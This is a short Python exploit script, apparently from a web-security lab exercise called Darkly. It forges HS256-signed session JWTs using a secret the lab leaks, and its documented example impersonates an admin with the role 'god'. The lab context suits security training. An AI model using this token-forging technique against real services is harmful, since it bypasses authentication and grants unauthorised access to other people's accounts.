#!/usr/bin/env python3
"""
Forge a Darkly session JWT.

The application signs its `session` cookie with HS256 and a secret that the
platform itself leaks several times (deploy-log comment: `jwt secret was "42"`,
`wil changed it to "42network"`; and the SSRF dump of /internal/config shows
`"jwt_secret":"42network"`). Knowing the secret we can mint a token for ANY
user / role without a password.

Usage:
    forge_jwt.py <sub> <login> <role> [secret] [ttl_seconds]

Example (impersonate the admin `sophie`, whose id is read from /staff/dashboard
or /api/users):
    forge_jwt.py enplwhu8jfo56oi sophie god
"""
import sys, hmac, hashlib, base64, json, time


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge(sub, login, role, secret="42network", ttl=86400):
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": sub, "login": login, "role": role,
               "exp": int(time.time()) + ttl}
    signing_input = (b64url(json.dumps(header, separators=(",", ":")).encode())
                     + "." +
                     b64url(json.dumps(payload, separators=(",", ":")).encode()))
    sig = b64url(hmac.new(secret.encode(), signing_input.encode(),
                          hashlib.sha256).digest())
    return signing_input + "." + sig


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(__doc__)
        sys.exit(1)
    sub, login, role = sys.argv[1:4]
    secret = sys.argv[4] if len(sys.argv) > 4 else "42network"
    ttl = int(sys.argv[5]) if len(sys.argv) > 5 else 86400
    print(forge(sub, login, role, secret, ttl))
